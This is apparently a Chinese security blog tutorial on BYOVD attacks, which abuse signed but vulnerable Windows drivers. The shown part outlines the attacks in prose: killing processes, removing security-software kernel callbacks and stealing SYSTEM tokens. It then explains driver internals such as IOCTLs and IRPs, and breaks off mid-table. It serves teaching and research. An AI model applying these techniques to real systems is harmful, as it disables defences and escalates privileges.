#  BYOVD利用方法论以及AI辅助下的驱动漏洞挖掘  
原创 网络保安29
                        网络保安29  红蓝攻防研究实验室   2026-04-19 12:38  
  
## 0x01 BYOVD原理  
  
BYOVD 是指滥用具有合法数字签名但存在设计缺陷或已知漏洞的驱动程序，以内核权限执行恶意操作，绕过用户态安全机制的防护。一般是驱动暴露的接口未能对来自用户态的请求进行严格的参数验证导致漏洞，最常见的有：驱动提供了读写任意内核地址的原语、驱动允许用户态程序指定一个内核函数地址并执行、驱动提供物理内存映射能力等。  
  
漏洞利用程序通过  
 DeviceIoControl   
函数，向驱动的设备对象发送精心构造的 IOCTL 请求。  
由于驱动的IOCTL处理程序存在漏洞，根据不同的驱动暴露的功能，攻击者一般能执行以下一个或多个操作：  
  
1、定位内核对象：利用任意读原语，通过 PsInitialSystemProcess 或遍历 ActiveProcessLinks 链表，定位关键数据结构，如目标进程的 EPROCESS 结构、线程的 ETHREAD 结构。  
  
2、终止进程：调用 ZwTerminateProcess、PsTerminateProcess 等内核函数强制终止进程；或终止进程的所有线程使其自然结束。  
  
3、禁用回调：通过 PsRemoveCreateProcessNotifyRoutine、PsRemoveLoadImageNotifyRoutine 等公开 API，移除安全软件注册的内核回调（需知道回调地址或 Cookie），使其无法监控系统活动。  
  
4、提升权限：替换当前进程的 TOKEN 为 SYSTEM 进程的 TOKEN，或将 TOKEN 中的权限位提升，实现权限提升至 SYSTEM 级别。  
  
......  
## 0x02 驱动基础  
  
以下是对驱动中重要数据结构的说明，挺长的，建议简单看一下。不想看的直接到下一章。  
### 1、驱动初始化  
#### 1.1 DriverEntry  
  
**DriverEntry**  
是内核驱动程序的入口点，等同于用户模式程序的 main 函数。当驱动被操作系统的I/O管理器加载时，此函数被自动调用。  
```
NTSTATUS DriverEntry(
    _In_ PDRIVER_OBJECT DriverObject,  // 系统分配的驱动对象指针
    _In_ PUNICODE_STRING RegistryPath   // 指向该驱动在注册表中配置项路径的指针
);
```  
```
在 DriverEntry 中，驱动程序必须完成一系列关键的初始化步骤，其核心任务流程如下：
```  
  
1、I/O管理器加载驱动并调用 DriverEntry  
  
2、初始化派遣函数数组（MajorFunction）  
  
3、创建设备对象（IoCreateDevice）  
  
4、创建符号链接（IoCreateSymbolicLink）  
  
5、注册卸载例程 （DriverUnload）  
#### 1.2 DriverObject   
  
**DriverObject**  
 是内核为驱动创建的一个核心数据结构，驱动通过初始化此对象的各个字段来告知系统其可以做什么。例如 MajorFunction 数组用于处理 I/O 请求，DriverUnload 指针用于指定清理函数。  
  
RegistryPath 通常用于从注册表（如 ...\Services\<DriverName>\Parameters）读取驱动特定的配置参数，实现驱动行为的外部定制。  
```
typedef struct _DRIVER_OBJECT {
  CSHORT             Type;
  CSHORT             Size;
  PDEVICE_OBJECT     DeviceObject;
  ULONG              Flags;
  PVOID              DriverStart;
  ULONG              DriverSize;
  PVOID              DriverSection;
  PDRIVER_EXTENSION  DriverExtension;
  UNICODE_STRING     DriverName;
  PUNICODE_STRING    HardwareDatabase;
  PFAST_IO_DISPATCH  FastIoDispatch;
  PDRIVER_INITIALIZE DriverInit;
  PDRIVER_STARTIO    DriverStartIo;
  PDRIVER_UNLOAD     DriverUnload;
  PDRIVER_DISPATCH   MajorFunction[IRP_MJ_MAXIMUM_FUNCTION + 1];
} DRIVER_OBJECT, *PDRIVER_OBJECT;
```  
```
1.3 MajorFunction
```  
  
DRIVER_OBJECT->MajorFunction  
派遣函数数组，DRIVER_OBJECT 结构中的 MajorFunction 是一个函数指针数组，每个索引对应一个特定的“主功能代码”。  
  
驱动程序不具有主线程，而是由内核可以在特定条件下调用的例程组成。驱动程序需要向 I/O 管理器注册分发例程（  
在 DriverEntry 中将其实现的处理例程赋值给相应的 MajorFunction 数组索引  
），来处理来自用户空间或其他驱动程序的请求。当在设备上调用 Windows API 时，驱动程序会通过运行特定例程来响应，每个 API 调用都映射到 MajorFunctions 数组中的特定索引，确保了在调用 API 函数后执行对应的例程。  
```
// 注册特定的分发例程 - 为特定IRP类型指定具体的处理函数
    DriverObject->MajorFunction[IRP_MJ_READ] = MyDispatchRead;    // 处理ReadFile
    DriverObject->MajorFunction[IRP_MJ_WRITE] = MyDispatchWrite; // 处理WriteFile
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = MyDispatchDeviceControl; // 处理DeviceIoControl
    DriverObject->MajorFunction[IRP_MJ_CREATE] = MyDispatchCreate; // 处理CreateFile
    DriverObject->MajorFunction[IRP_MJ_CLOSE] = MyDispatchClose;   // 处理CloseHandle
```  
  
在 MajorFunction 数组中，有一个标识为 IRP_MJ_DEVICE_CONTROL 的专用条目，驱动程序在此位置存储其分发例程的函数指针，当应用程序对设备调用 DeviceIoControl 时会触发该指针，这个例程接收的参数之一是 I/O 控制代码 (IOCTL)。IOCTL 是用户态应用程序和内核态设备驱动之间的桥梁，驱动内部通过解析不同的命令码来执行相应的操作。  
  
DeviceIoControl 是用户态程序与内核驱动通信的核心 API。  
```
WINBASEAPI BOOL WINAPI DeviceIoControl(
    _In_ HANDLE hDevice,
    _In_ DWORD dwIoControlCode, //I/O 控制代码
    _In_reads_bytes_opt_(nInBufferSize) LPVOID lpInBuffer,//输入缓冲区
    _In_ DWORD nInBufferSize,
    _Out_writes_bytes_to_opt_(nOutBufferSize,*lpBytesReturned) LPVOID lpOutBuffer,
    _In_ DWORD nOutBufferSize,
    _Out_opt_ LPDWORD lpBytesReturned,
    _Inout_opt_ LPOVERLAPPED lpOverlapped
    );
```  
```
2、IOCTL 结构
```  
  
IOCTL 代码是一个 32 位的值，包含了多个预定义的字段，其结构如下：  
<table><tbody><tr><td data-colwidth="83" width="97"><p style="margin-top: 8px;margin-bottom: 8px;text-align: left;"><strong><span leaf="" style="color: rgba(0, 0, 0, 0.9);font-size: 17px;font-family: mp-quote, &#34;PingFang SC&#34;, system-ui, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;line-height: 1.6;letter-spacing: 0.034em;font-style: normal;font-weight: normal;"><span textstyle="" style="font-size: 16px;">比特位范围</span></span></strong></p></td><td data-colwidth="100" width="120"><p style="margin-top: 8px;margin-bottom: 8px;text-align: left;"><strong><span leaf="" style="color: rgba(0, 0, 0, 0.9);font-size: 17px;font-family: mp-quote, &#34;PingFang SC&#34;, system-ui, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;line-height: 1.6;letter-spacing: 0.034em;font-style: normal;font-weight: normal;"><span textstyle="" style="font-size: 16px;">字段名称</span></span></strong></p></td><td data-colwidth="306" width="447"><p style="margin-top: 8px;margin-bottom: 8px;text-align: left;"><strong><span leaf="" style="color: rgba(0, 0, 0, 0.9);font-size: 17px;font-family: mp-quote, &#34;PingFang SC&#34;, system-ui, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;line-height: 1.6;letter-spacing: 0.034em;font-style: normal;font-weight: normal;"><span textstyle="" style="font-size: 16px;">说明</span></span></strong></p></td><td data-colwidth="86" width="86"><p style="margin-top: 8px;margin-bottom: 8px;text-align: left;"><strong><span leaf="" style="color: rgba(0, 0, 0, 0.9);font-size: 17px;font-family: mp-quote, &#34;PingFang SC&#34;, system-ui, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;line-height: 1.6;letter-spacing: 0.034em;font-style: normal;font-weight: normal;"><span textstyle="" style="font-size: 16px;">示例值</span></span></strong></p></td></tr><tr><td data-colwidth="83" width="97"><p style="margin-top: 8px;margin-bottom: 8px;text-align: left;"><span leaf="" style="color: rgba(0, 0, 0, 0.9);font-size: 17px;font-family: mp-quote, &#34;PingFang SC&#34;, system-ui, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;line-height: 1.6;letter-spacing: 0.034em;font-style: normal;font-weight: normal;"><span textstyle="" style="font-size: 16px;">31-16</span></span></p></td><td data-colwidth="100" width="120"><p style="margin-top: 8px;margin-bottom: 8px;text-align: left;"><strong><span leaf="" style="color: rgba(0, 0, 0, 0.9);font-size: 17px;font-family: mp-quote, &#34;PingFang SC&#34;, system-ui, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;line-height: 1.6;letter-spacing: 0.034em;font-style: normal;font-weight: normal;"><span textstyle="" style="font-size: 16px;">设备类型</span></span></strong></p></td><td data-colwidth="306" width="447"><p style="margin-top: 8px;margin-bottom: 8px;text-align: left;"><span leaf="" style="color: rgba(0, 0, 0, 0.9);font-size: 17px;font-family: mp-quote, &#34;PingFang SC&#34;, system-ui, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;line-height: 1.6;letter-spacing: 0.034em;font-style: normal;font-weight: normal;"><span textstyle="" style="font-size: 16px;">标识设备的大类，如磁盘、串口等。</span></span></p><p style="margin-top: 8px;margin-bottom: 8px;text-align: left;"><span leaf="" style="color: rgba(0, 0, 0, 0.9);font-size: 17px;font-family: mp-quote, &#34;PingFang SC&#34;, system-ui, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;line-height: 1.6;letter-spacing: 0.034em;font-style: normal;font-weight: normal;"><span textstyle="" style="font-size: 16px;">0x22 常代表 FILE_DEVICE_UNKNOWN</span></span></p></td><td data-colwidth="86" width="86"><p style="margin-top: 8px;margin-bottom: 8px;text-align: left;"><span leaf="" style="color: rgba(0, 0, 0, 0.9);font-size: 17px;font-family: mp-quote, &#34;PingFang SC&#34;, system-ui, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;line-height: 1.6;letter-spacing: 0.034em;font-style: normal;font-weight: normal;"><span textstyle="" style="font-size: 16px;">0x22</span></span></p></td></tr><tr><td data-colwidth="83" width="97"><p style="margin-top: 8px;margin-bottom: 8px;text-align: left;"><span leaf="" style="color: rgba(0, 0, 0, 0.9);font-size: 17px;font-family: mp-quote, &#34;PingFang SC&#34;, system-ui, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;line-height: 1.6;letter-spacing: 0.034em;font-style: normal;font-weight: normal;"><span textstyle="" style="font-size: 16px;">15-14</span></span></p></td><td data-colwidth="100" width="120"><p style="margin-top: 8px;margin-bottom: 8px;text-align: left;"><strong><span leaf="" style="color: rgba(0, 0, 0, 0.9);font-size: 17px;font-family: mp-quote, &#34;PingFang SC&#34;, system-ui, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;line-height: 1.6;letter-spacing: 0.034em;font-style: normal;font-weight: normal;"><span textstyle="" style="font-size: 16px;">必需的访问权限</span></span></strong></p></td><td data-colwidth="306" width="447"><p style="margin-top: 8px;margin-bottom: 8px;text-align: left;"><span leaf="" style="color: rgba(0, 0, 0, 0.9);font-size: 17px;font-family: mp-quote, &#34;PingFang SC&#34;, system-ui, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;line-height: 1.6;letter-spacing: 0.034em;font-style: normal;font-weight: normal;"><span textstyle="" style="font-size: 16px;">应用程序需要什么样的权限来打开设备，如 FILE_ANY_ACCESS</span></span></p></td><td data-colwidth="86" width="86"><p style="margin-top: 8px;margin-bottom: 8px;text-align: left;"><span leaf="" style="color: rgba(0, 0, 0, 0.9);font-size: 17px;font-family: mp-quote, &#34;PingFang SC&#34;, system-ui, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;line-height: 1.6;letter-spacing: 0.034em;font-style: normal;font-weight: normal;"><span textstyle="" style="font-size: 16px;">0</span></span></p></td></tr><tr><td data-colwidth="83" width="97"><p style="margin-top: 8px;margin-bottom: 8px;text-align: left;"><span leaf="" style="color: rgba(0, 0, 0, 0.9);font-size: 17px;font-family: mp-quote, &#34;PingFang SC&#34;, system-ui, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;line-height: 1.6;letter-spacing: 0.034em;font-style: normal;font-weight: normal;"><span textstyle="" style="font-size: 16px;">13-2</span></span></p></td><td data-colwidth="100" width="120"><p style="margin-top: 8px;margin-bottom: 8px;text-align: left;"><strong><span leaf="" style="color: rgba(0, 0, 0, 0.9);font-size: 17px;font-family: mp-quote, &#34;PingFang SC&#34;, system-ui, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;line-height: 1.6;letter-spacing: 0.034em;font-style: normal;font-weight: normal;"><span textstyle="" style="font-size: 16px;">功能代码</span></span></strong></p></td><td data-colwidth="306" width="447"><p style="margin-top: 8px;margin-bottom: 8px;text-align: left;"><span leaf="" style="color: rgba(0, 0, 0, 0.9);font-size: 17px;font-family: mp-quote, &#34;PingFang SC&#34;, system-ui, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;line-height: 1.6;letter-spacing: 0.034em;font-style: normal;font-weight: normal;"><span textstyle="" style="font-size: 16px;">驱动自定义的操作代码，这是核心，指明要执行的具体操作。</span></span></p></td><td data-colwidth="86" width="86"><p style="margin-top: 8px;margin-bottom: 8px;text-align: left;"><span leaf="" style="color: rgba(0, 0, 0, 0.9);font-size: 17px;font-family: mp-quote, &#34;PingFang SC&#34;, system-ui, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;line-height: 1.6;letter-spacing: 0.034em;font-style: normal;font-weight: normal;"><span textstyle="" style="font-size: 16px;">0x802</span></span></p></td></tr><tr><td data-colwidth="83" width="97"><p style="margin-top: 8px;margin-bottom: 8px;text-align: left;"><span leaf="" style="color: rgba(0, 0, 0, 0.9);font-size: 17px;font-family: mp-quote, &#34;PingFang SC&#34;, system-ui, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;line-height: 1.6;letter-spacing: 0.034em;font-style: normal;font-weight: normal;"><span textstyle="" style="font-size: 16px;">1-0</span></span></p></td><td data-colwidth="100" width="120"><p style="margin-top: 8px;margin-bottom: 8px;text-align: left;"><strong><span leaf="" style="color: rgba(0, 0, 0, 0.9);font-size: 17px;font-family: mp-quote, &#34;PingFang SC&#34;, system-ui, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;line-height: 1.6;letter-spacing: 0.034em;font-style: normal;font-weight: normal;"><span textstyle="" style="font-size: 16px;">传输方法</span></span></strong></p></td><td data-colwidth="306" width="447"><p style="margin-top: 8px;margin-bottom: 8px;text-align: left;"><span leaf="" style="color: rgba(0, 0, 0, 0.9);font-size: 17px;font-family: mp-quote, &#34;PingFang SC&#34;, system-ui, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;line-height: 1.6;letter-spacing: 0.034em;font-style: normal;font-weight: normal;"><span textstyle="" style="font-size: 16px;">定义内核与用户模式程序如何交换数据，如 METHOD_BUFFERED</span></span></p></td><td data-colwidth="86" width="86"><p style="margin-top: 8px;margin-bottom: 8px;text-align: left;"><span leaf="" style="color: rgba(0, 0, 0, 0.9);font-size: 17px;font-family: mp-quote, &#34;PingFang SC&#34;, system-ui, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;line-height: 1.6;letter-spacing: 0.034em;font-style: normal;font-weight: normal;"><span textstyle="" style="font-size: 16px;">0</span></span></p></td></tr></tbody></table>  
一个完整的 IOCTL 代码就是由这些字段组合而成的，在 Windows 上，驱动开发者使用    
CTL_CODE  
宏来生成这个值。  
### 3、IPR 结构  
  
当用户应用程序通过 CreateFile 打开设备，并使用 DeviceIoControl 发送控制代码时，I/O 管理器会创建一个IRP（I/O Request Packet，I/O请求包），并将其路由到驱动中相应的派遣函数。  
IRP 用于在 I/O 操作过程中传递请求和控制信息，是在驱动程序间传递 I/O 请求的基本单位。  
#### 3.1 IRP 结构核心成员  
  
需要重点关注的是 AssociatedIrp 和 Tail.Overlay.CurrentStackLocation，它们分别与数据传输方式和IOCTL码有关。当在逆向驱动时看到对这两个数据结构的访问，很可能就是在取传递的参数和IOCTL码。  
```
typedef struct _IRP {
  CSHORT  Type;                    // +0x00
  USHORT  Size;                    // +0x02
  PMDL    MdlAddress;              // +0x08（直接I/O用）
  ULONG   Flags;                   // +0x10
  union {
    struct _IRP *MasterIrp;
    PVOID        SystemBuffer;     // +0x18 ★缓冲I/O的输入参数在这里
  } AssociatedIrp;
  ...
  PVOID   UserBuffer;              // +0x60（METHOD_NEITHER用）
  union {
    PETHREAD Thread;               // +0x68 发起请求的线程
    struct _IO_STACK_LOCATION *CurrentStackLocation; // ★IOCTL在这里
    ...
  } Tail;
} IRP;
```  
```
3.2 IO_STACK_LOCATION 结构
```  
  
每个 IRP 有一个 IO_STACK_LOCATION，包含当前请求的详细信息：  
```
typedef struct _IO_STACK_LOCATION {
  UCHAR MajorFunction;             // +0x00 请求类型（IRP_MJ_DEVICE_CONTROL=0xE）
  UCHAR MinorFunction;             // +0x01
  ...
  union {
    struct {
      ULONG IoControlCode;         // ★ IOCTL 值
      ULONG InputBufferLength;     // ★ 输入缓冲区长度
      ULONG OutputBufferLength;    // 输出缓冲区长度
    } DeviceIoControl;
    ...
  } Parameters;
} IO_STACK_LOCATION;
```  
### 4、驱动的数据传递方式  
  
驱动程序处理 I/O 缓冲区数据主要有三种方式，这通常由设备对象创建时的标志（  
DO_BUFFERED_IO  
、  
DO_DIRECT_IO  
）或 IOCTL 码的最后2位比特位决定 。  
<table><tbody><tr><td data-colwidth="72" width="78"><p style="margin-top: 0px;margin-bottom: 0px;text-align: left;"><strong><span leaf="" style="color: rgba(0, 0, 0, 0.9);font-size: 17px;font-family: mp-quote, &#34;PingFang SC&#34;, system-ui, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;line-height: 1.6;letter-spacing: 0.034em;font-style: normal;font-weight: normal;"><span textstyle="" style="font-size: 15px;">比特位</span></span></strong></p></td><td data-colwidth="117" width="178"><p style="margin-top: 8px;margin-bottom: 8px;text-align: left;"><strong><span leaf="" style="color: rgba(0, 0, 0, 0.9);font-size: 17px;font-family: mp-quote, &#34;PingFang SC&#34;, system-ui, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;line-height: 1.6;letter-spacing: 0.034em;font-style: normal;font-weight: normal;"><span textstyle="" style="font-size: 15px;">传输方法</span></span></strong></p></td><td data-colwidth="466" width="472"><p style="margin-top: 8px;margin-bottom: 8px;text-align: left;"><strong><span leaf="" style="color: rgba(0, 0, 0, 0.9);font-size: 17px;font-family: mp-quote, &#34;PingFang SC&#34;, system-ui, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;line-height: 1.6;letter-spacing: 0.034em;font-style: normal;font-weight: normal;"><span textstyle="" style="font-size: 15px;">说明</span></span></strong></p></td></tr><tr><td data-colwidth="72" width="78"><p style="margin-top: 8px;margin-bottom: 8px;text-align: left;"><span leaf="" style="color: rgba(0, 0, 0, 0.9);font-size: 17px;font-family: mp-quote, &#34;PingFang SC&#34;, system-ui, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;line-height: 1.6;letter-spacing: 0.034em;font-style: normal;font-weight: normal;"><span textstyle="" style="font-size: 15px;">00</span></span></p></td><td data-colwidth="117" width="178"><p style="margin-top: 8px;margin-bottom: 8px;text-align: left;"><span leaf="" style="color: rgba(0, 0, 0, 0.9);font-size: 17px;font-family: mp-quote, &#34;PingFang SC&#34;, system-ui, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;line-height: 1.6;letter-spacing: 0.034em;font-style: normal;font-weight: normal;"><span textstyle="" style="font-size: 15px;">METHOD_BUFFERED</span></span></p></td><td data-colwidth="466" width="472"><p style="margin-top: 0px;margin-bottom: 0px;text-align: left;"><strong><span leaf="" style="color: rgba(0, 0, 0, 0.9);font-size: 17px;font-family: mp-quote, &#34;PingFang SC&#34;, system-ui, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;line-height: 1.6;letter-spacing: 0.034em;font-style: normal;font-weight: normal;"><span textstyle="" style="font-size: 15px;">缓冲 I/O</span></span></strong><span leaf="" style="color: rgba(0, 0, 0, 0.9);font-size: 17px;font-family: mp-quote, &#34;PingFang SC&#34;, system-ui, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;line-height: 1.6;letter-spacing: 0.034em;font-style: normal;font-weight: normal;"><span textstyle="" style="font-size: 15px;">。I/O 管理器将用户模式的输入/输出数据复制到内核模式下的非分页池中（Irp-&gt;AssociatedIrp.SystemBuffer）。驱动通过该系统缓冲区安全访问数据。</span></span><strong><span leaf="" style="color: rgba(0, 0, 0, 0.9);font-size: 17px;font-family: mp-quote, &#34;PingFang SC&#34;, system-ui, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;line-height: 1.6;letter-spacing: 0.034em;font-style: normal;font-weight: normal;"><span textstyle="" style="font-size: 15px;">最常用、最安全</span></span></strong><span leaf="" style="color: rgba(0, 0, 0, 0.9);font-size: 17px;font-family: mp-quote, &#34;PingFang SC&#34;, system-ui, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;line-height: 1.6;letter-spacing: 0.034em;font-style: normal;font-weight: normal;"><span textstyle="" style="font-size: 15px;">。</span></span></p></td></tr><tr><td data-colwidth="72" width="78"><p style="margin-top: 8px;margin-bottom: 8px;text-align: left;"><span leaf="" style="color: rgba(0, 0, 0, 0.9);font-size: 17px;font-family: mp-quote, &#34;PingFang SC&#34;, system-ui, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;line-height: 1.6;letter-spacing: 0.034em;font-style: normal;font-weight: normal;"><span textstyle="" style="font-size: 15px;">01</span></span></p></td><td data-colwidth="117" width="178"><p style="margin-top: 8px;margin-bottom: 8px;text-align: left;"><span leaf="" style="color: rgba(0, 0, 0, 0.9);font-size: 17px;font-family: mp-quote, &#34;PingFang SC&#34;, system-ui, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;line-height: 1.6;letter-spacing: 0.034em;font-style: normal;font-weight: normal;"><span textstyle="" style="font-size: 15px;">METHOD_IN_DIRECT</span></span></p></td><td data-colwidth="466" width="472"><p style="margin-top: 8px;margin-bottom: 8px;text-align: left;"><strong><span leaf="" style="color: rgba(0, 0, 0, 0.9);font-size: 17px;font-family: mp-quote, &#34;PingFang SC&#34;, system-ui, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;line-height: 1.6;letter-spacing: 0.034em;font-style: normal;font-weight: normal;"><span textstyle="" style="font-size: 15px;">直接输入 I/O</span></span></strong><span leaf="" style="color: rgba(0, 0, 0, 0.9);font-size: 17px;font-family: mp-quote, &#34;PingFang SC&#34;, system-ui, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;line-height: 1.6;letter-spacing: 0.034em;font-style: normal;font-weight: normal;"><span textstyle="" style="font-size: 15px;">。对于输入数据，I/O 管理器将其复制到系统缓冲区（同 METHOD_BUFFERED）。对于输出数据，I/O 管理器锁定用户输出缓冲区的物理内存页，并构建一个 MDL（Irp-&gt;MdlAddress）供驱动访问。适用于设备向应用程序</span></span><strong><span leaf="" style="color: rgba(0, 0, 0, 0.9);font-size: 17px;font-family: mp-quote, &#34;PingFang SC&#34;, system-ui, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;line-height: 1.6;letter-spacing: 0.034em;font-style: normal;font-weight: normal;"><span textstyle="" style="font-size: 15px;">输出大量数据</span></span></strong><span leaf="" style="color: rgba(0, 0, 0, 0.9);font-size: 17px;font-family: mp-quote, &#34;PingFang SC&#34;, system-ui, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;line-height: 1.6;letter-spacing: 0.034em;font-style: normal;font-weight: normal;"><span textstyle="" style="font-size: 15px;">。</span></span></p></td></tr><tr><td data-colwidth="72" width="78"><p style="margin-top: 8px;margin-bottom: 8px;text-align: left;"><span leaf="" style="color: rgba(0, 0, 0, 0.9);font-size: 17px;font-family: mp-quote, &#34;PingFang SC&#34;, system-ui, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;line-height: 1.6;letter-spacing: 0.034em;font-style: normal;font-weight: normal;"><span textstyle="" style="font-size: 15px;">10</span></span></p></td><td data-colwidth="117" width="178"><p style="margin-top: 8px;margin-bottom: 8px;text-align: left;"><span leaf="" style="color: rgba(0, 0, 0, 0.9);font-size: 17px;font-family: mp-quote, &#34;PingFang SC&#34;, system-ui, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;line-height: 1.6;letter-spacing: 0.034em;font-style: normal;font-weight: normal;"><span textstyle="" style="font-size: 15px;">METHOD_OUT_DIRECT</span></span></p></td><td data-colwidth="466" width="472"><p style="margin-top: 8px;margin-bottom: 8px;text-align: left;"><strong><span leaf="" style="color: rgba(0, 0, 0, 0.9);font-size: 17px;font-family: mp-quote, &#34;PingFang SC&#34;, system-ui, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft 